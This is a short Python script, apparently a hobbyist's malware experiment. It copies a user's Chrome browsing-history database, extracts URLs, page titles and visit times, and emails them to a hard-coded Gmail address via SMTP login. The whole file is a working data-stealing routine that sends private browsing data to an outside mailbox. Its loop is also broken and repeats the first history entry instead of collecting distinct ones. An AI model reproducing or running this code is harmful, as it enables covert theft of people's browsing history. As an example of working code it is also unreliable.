from email.message import EmailMessage
import os
import shutil
import smtplib
import sqlite3
original_db_path = os.path.expanduser("~/.config/google-chrome/Default/History")  # replace with the actual path
copy_db_path = "/home/Rahul/Documents/Rahul/Malware/chrome.txt"  # replace with your desired path
shutil.copyfile(original_db_path, copy_db_path)
connection = sqlite3.connect(copy_db_path)
cursor = connection.cursor()
query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
cursor.execute(query)
history_entries = cursor.fetchall()
historyList = []
count = 1
for entry in history_entries:
    while count < 50:
        url, title, last_visit_time = entry
        historyDict = {
            "URL":url,
            "TITLE":title,
            "LAST VISIT TIME":last_visit_time,
        }
        historyList.append(historyDict)
        count += 1
sndto = "rahulkallingal9@gmail.com"
subject = "subject"
messagebody = str(historyList)
smtpserver = "smtp.gmail.com"
smtpport = 587
tlsauth = "Yes"
frmaddr = "rahulkallingal05@gmail.com"
passwd = "XXXXXXXXXX"
if messagebody:
    msgbody = messagebody
else:
    msgbody = "The mail system is ready to send the data to the end user"
msg = EmailMessage()
msg.set_type('text/html')
msg.set_content(msgbody, subtype='html')
msg['Subject'] = subject
msg['From'] = frmaddr
msg['To'] = sndto
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(frmaddr, passwd)
server.send_message(msg)
server.quit()